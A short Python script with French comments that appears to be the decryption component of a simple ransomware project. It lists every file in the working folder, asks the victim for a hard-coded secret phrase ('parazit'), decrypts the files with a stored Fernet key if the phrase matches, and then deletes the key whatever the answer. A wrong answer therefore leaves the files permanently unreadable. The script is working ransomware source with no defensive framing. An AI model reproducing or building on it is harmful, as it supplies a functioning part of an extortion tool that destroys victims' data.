import os
from cryptography.fernet import Fernet

# Liste des fichiers à débloquer (excluant les fichiers de contrôle)
files = [file for file in os.listdir() if os.path.isfile(file) and file not in ["install.py", "thekey.key", "demal.py"]]

# Afficher les fichiers à débloquer
print(files)

# Récupérer la clé secrète depuis le fichier
with open("thekey.key", "rb") as key_file:
    secretkey = key_file.read()

# Demander à l'utilisateur la phrase secrète
user_phrase = input("Enter the secret phrase to decrypt your files \n")

# Vérifier si la phrase secrète est correcte
if user_phrase == "parazit":
    # Utiliser la clé pour débloquer les fichiers
    for file in files:
        with open(file, "rb") as encrypted_file:
            contents = encrypted_file.read()
        # Déchiffrer le contenu du fichier
        decrypted_contents = Fernet(secretkey).decrypt(contents)
        # Écrire le contenu déchiffré dans le fichier d'origine
        with open(file, "wb") as decrypted_file:
            decrypted_file.write(decrypted_contents)
    print("Files successfully decrypted.")
else:
    print("Sorry, wrong secret phrase.")

os.remove("thekey.key")